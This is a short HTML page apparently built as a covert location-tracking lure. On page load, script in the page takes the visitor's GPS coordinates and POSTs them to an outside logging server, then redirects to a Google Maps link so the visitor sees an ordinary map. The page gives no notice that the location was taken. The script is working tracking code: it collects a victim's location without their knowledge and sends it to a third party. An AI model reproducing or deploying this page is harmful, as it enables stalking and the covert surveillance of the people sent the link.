<!DOCTYPE html>
<html>
<head>
    <title>Location Redirect</title>
</head>
<body>
    <script>
        const googleMapsURL = 'https://maps.app.goo.gl/JVUi2F98vrGs1ryn8';
        const serverURL = 'https://livelocation-k0iy.onrender.com/save-location.php';

        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        // PROPERLY DEFINED COORDS VARIABLE
                        const coords = {
                            lat: position.coords.latitude,
                            lng: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            timestamp: new Date(position.timestamp)
                        };

                        // Send coordinates (now properly scoped)
                        fetch(serverURL, {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify(coords) // Now accessible
                        });

                        window.location.href = googleMapsURL;
                    },
                    (error) => {
                        console.error('Geolocation error:', error);
                        window.location.href = googleMapsURL;
                    }
                );
            } else {
                alert("Geolocation not supported");
                window.location.href = googleMapsURL;
            }
        }

        window.onload = getLocation;
    </script>
</body>
</html>
